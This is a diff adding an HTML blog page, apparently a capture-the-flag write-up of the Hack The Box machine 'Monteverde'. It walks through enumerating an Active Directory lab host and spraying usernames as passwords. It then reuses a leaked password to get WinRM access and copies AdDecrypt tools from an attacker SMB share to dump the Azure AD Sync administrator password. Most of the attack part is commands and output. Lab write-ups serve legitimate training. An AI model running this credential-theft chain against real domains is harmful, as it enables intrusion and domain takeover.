@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/monteverde.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/monteverde.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/monteverde.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="monteverde">Monteverde</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Scan with nmap reported the following ports opened:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE        REASON
+53/tcp    open  domain         syn-ack
+88/tcp    open  kerberos-sec   syn-ack
+135/tcp   open  msrpc          syn-ack
+139/tcp   open  netbios-ssn    syn-ack
+389/tcp   open  ldap           syn-ack
+445/tcp   open  microsoft-ds   syn-ack
+464/tcp   open  kpasswd5       syn-ack
+593/tcp   open  http-rpc-epmap syn-ack
+636/tcp   open  ldapssl        syn-ack
+5985/tcp  open  wsman          syn-ack
+9389/tcp  open  adws           syn-ack
+49667/tcp open  unknown        syn-ack
+49673/tcp open  unknown        syn-ack
+49674/tcp open  unknown        syn-ack
+49676/tcp open  unknown        syn-ack
+49697/tcp open  unknown        syn-ack
+52040/tcp open  unknown        syn-ack
+</code></pre></div></div>
+
+<h2 id="getting-the-domain-name">Getting the domain name</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.172  
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Domain name is <code class="language-plaintext highlighter-rouge">MEGABANK.LOCAL</code> and machine name is <code class="language-plaintext highlighter-rouge">MONTEVERDE</code></p>
+
+<h2 id="dns">DNS</h2>
+
+<ul>
+  <li>No unexpected DNS records found</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>dig ANY MEGABANK.LOCAL @10.10.10.172
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.16-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> ANY MEGABANK.LOCAL @10.10.10.172
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> WARNING: .local is reserved <span class="k">for </span>Multicast DNS
+<span class="p">;;</span> You are currently testing what happens when an mDNS query is leaked to DNS
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 34138
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 4
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;MEGABANK.LOCAL.                        IN      ANY
+
+;; ANSWER SECTION:
+MEGABANK.LOCAL.         600     IN      A       10.10.10.172
+MEGABANK.LOCAL.         3600    IN      NS      monteverde.MEGABANK.LOCAL.
+MEGABANK.LOCAL.         3600    IN      SOA     monteverde.MEGABANK.LOCAL. hostmaster.MEGABANK.LOCAL. 58 900 600 86400 3600
+MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::95d6:873a:9fa5:ee9
+MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::18d
+MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::2dbe:bf36:8e26:db76
+
+;; ADDITIONAL SECTION:
+monteverde.MEGABANK.LOCAL. 1200 IN      A       10.10.10.172
+monteverde.MEGABANK.LOCAL. 1200 IN      AAAA    dead:beef::95d6:873a:9fa5:ee9
+monteverde.MEGABANK.LOCAL. 1200 IN      AAAA    dead:beef::18d
+</span></code></pre></div></div>
+
+<ul>
+  <li>Transfer zone failed as well</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>dig axfr MEGABANK.LOCAL @10.10.10.172
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.16-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr MEGABANK.LOCAL @10.10.10.172
+<span class="p">;;</span> global options: +cmd
+<span class="p">;</span> Transfer failed.
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<ul>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> <span class="s1">'%'</span> <span class="nt">-p</span> <span class="s1">'%'</span> <span class="nt">--shares</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\%</span>:% STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.172<span class="se">\\</span> 
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.172 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h2 id="rpc">RPC</h2>
+
+<ul>
+  <li>Null session allowed</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.10.172
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+</code></pre></div></div>
+
+<h2 id="ldap">LDAP</h2>
+
+<ul>
+  <li>We can query ldap, but we cannot use ldapdomaindump</li>
+</ul>
+
+<h3 id="groups">Groups</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Group: <span class="s1">'Group Policy Creator Owners'</span> <span class="o">(</span>RID: 520<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator                                                                                                                                                          
+                                                                                                                                                                                                                                          
+Group: <span class="s1">'Trading'</span> <span class="o">(</span>RID: 2610<span class="o">)</span> has member: MEGABANK<span class="se">\d</span>galanos                                                                                                                                                                                  
+                                                                                                                                                                                                                                        
+Group: <span class="s1">'Domain Guests'</span> <span class="o">(</span>RID: 514<span class="o">)</span> has member: MEGABANK<span class="se">\G</span>uest                                                                                                                                                                                
+                                                                                                                                                                                                                                       
+Group: <span class="s1">'HelpDesk'</span> <span class="o">(</span>RID: 2611<span class="o">)</span> has member: MEGABANK<span class="se">\r</span>oleary
+                                                                                                                                                                                                                                        
+Group: <span class="s1">'Azure Admins'</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator                                                                                                                                                                        
+Group: <span class="s1">'Azure Admins'</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>AD_987d7f2f57d2
+Group: <span class="s1">'Azure Admins'</span> <span class="o">(</span>RID: 2601<span class="o">)</span> has member: MEGABANK<span class="se">\m</span>hope
+                                                                                                                                                                                                                                      
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator                                                                                                                                                                         
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\k</span>rbtgt
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>AD_987d7f2f57d2
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\m</span>hope
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\S</span>ABatchJobs
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-ata
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-bexec
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>vc-netapp
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\d</span>galanos
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\r</span>oleary
+Group: <span class="s1">'Domain Users'</span> <span class="o">(</span>RID: 513<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>morgan
+                                                                                                                                                                                                                                      
+Group: <span class="s1">'Operations'</span> <span class="o">(</span>RID: 2609<span class="o">)</span> has member: MEGABANK<span class="se">\s</span>morgan
+</code></pre></div></div>
+
+<p>Since we cannot get nothing from LDAP or RPC, we will try bruteforce to get password from a user.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>Trying username as the password seems to be a good bet.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> <span class="s1">'SABatchJobs'</span> <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span> 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
+</code></pre></div></div>
+
+<p>From here we will enumerate other services, but now authenticated. Enumerating users shares we find a share with users folders and a password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.172  <span class="nt">-u</span> <span class="s1">'SABatchJobs'</span> <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span> <span class="nt">--shares</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="nv">$ </span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.10.10.172    445    MONTEVERDE       <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.172    445    MONTEVERDE       ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
+SMB         10.10.10.172    445    MONTEVERDE       C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.172    445    MONTEVERDE       E<span class="nv">$ </span>                             Default share
+SMB         10.10.10.172    445    MONTEVERDE       IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="nb">users</span><span class="nv">$ </span>         READ
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.10.172<span class="se">\\</span><span class="nb">users</span><span class="nv">$ </span><span class="nt">-U</span> MEGABANK.LOCAL/SABatchJobs%<span class="s1">'SABatchJobs'</span> 
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Fri Jan  3 14:12:48 2020
+  ..                                  D        0  Fri Jan  3 14:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
+  mhope                               D        0  Fri Jan  3 14:41:18 2020
+  roleary                             D        0  Fri Jan  3 14:10:30 2020
+  smorgan                             D        0  Fri Jan  3 14:10:24 2020
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Fri Jan  3 14:41:18 2020
+  ..                                  D        0  Fri Jan  3 14:41:18 2020
+  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020
+
+                31999 blocks of size 4096. 28979 blocks available
+</code></pre></div></div>
+
+<p>From RPC we saw that user mhope is part of Azure Admins group, so its a good user to try this password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> <span class="s1">'mhope'</span> <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>       
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Trying with winrm we got a pwn3d!, meaning that we can connect to the machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/monteverde]
+└─<span class="nv">$ </span>crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> <span class="s1">'mhope'</span> <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>                      
+SMB         10.10.10.172    5985   MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span>
+HTTP        10.10.10.172    5985   MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.172:5985/wsman
+WINRM       10.10.10.172    5985   MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="nv">$ </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Once inside the machine we can see a <strong>.Azure</strong> folder:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\u</span>sers<span class="se">\m</span>hope&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\u</span>sers<span class="se">\m</span>hope
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----       10/27/2023   2:55 PM                .Azure
+d-r---         1/3/2020   5:24 AM                3D Objects
+d-r---         1/3/2020   5:24 AM                Contacts
+d-r---         1/3/2020   5:47 AM                Desktop
+d-r---         1/3/2020   5:24 AM                Documents
+d-r---       10/27/2023   3:34 PM                Downloads
+d-r---         1/3/2020   5:24 AM                Favorites
+d-r---         1/3/2020   5:24 AM                Links
+d-r---         1/3/2020   5:24 AM                Music
+d-r---         1/3/2020   5:24 AM                Pictures
+d-r---         1/3/2020   5:24 AM                Saved Games
+d-r---         1/3/2020   5:24 AM                Searches
+d-r---         1/3/2020   5:24 AM                Videos
+</code></pre></div></div>
+
+<p>Now we can try to use token and information from that directory to escalate privilege, but none of that will work. In the users directory we can see another user <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code> . Checking at he information we have about this user we can obtain that:</p>
+
+<ul>
+  <li>This user is also part of Azure Admins</li>
+  <li>This user is related with sync stuff</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] General info:
+    User Name   :    AAD_987d7f2f57d2
+    Full Name   :    AAD_987d7f2f57d2
+    Home Drive  :    
+    Dir Drive   :    
+    Profile Path:    
+    Logon Script:    
+    Description :    Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+</code></pre></div></div>
+
+<p>There might be something interesting about azure and synchronization.  A quick search on google about <code class="language-plaintext highlighter-rouge">azure ad sync privilege escalation</code> will gives us what we are looking for. To exploit this we have to transfer the files from this repository https://github.com/VbScrub/AdSyncDecrypt/ to the victim.</p>
+
+<ul>
+  <li>We copy the .exe and .dll in a writable route</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\s</span>hare<span class="se">\m</span>crypt.dll <span class="nb">.</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\s</span>hare<span class="se">\A</span>dDecrypt.exe <span class="nb">.</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        1/13/2020   3:11 PM          14848 AdDecrypt.exe
+<span class="nt">-a----</span>        1/12/2020  12:33 PM         334248 mcrypt.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Now we go to the folder  <code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Azure AD Sync\Bin</code> , and execute the transfered binary from here. The result is the admin password:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments<span class="se">\A</span>dDecrypt.exe <span class="nt">-FullSQL</span>
+
+<span class="o">======================</span>
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+<span class="o">======================</span>
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\a</span>dministrator
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
